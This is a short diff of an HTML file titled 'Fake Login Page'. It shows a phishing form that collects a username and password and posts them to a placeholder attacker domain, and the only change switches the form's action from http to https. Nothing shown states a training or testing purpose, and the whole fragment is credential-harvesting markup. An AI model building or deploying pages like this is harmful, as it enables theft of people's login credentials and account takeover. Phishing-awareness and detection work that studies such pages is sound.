@@ -29,7 +29,7 @@
     <title>Fake Login Page</title>
     <body>
         <h2>Login to Your Account</h2>
-        <form action="http://[ATTACKER-DOMAIN]" method="POST">
+        <form action="https://[ATTACKER-DOMAIN]" method="POST">
             <input type="text" name="username" placeholder="Username" required>
             <input type="password" name="password" placeholder="Password" required>
             <input type="submit" value="Login">
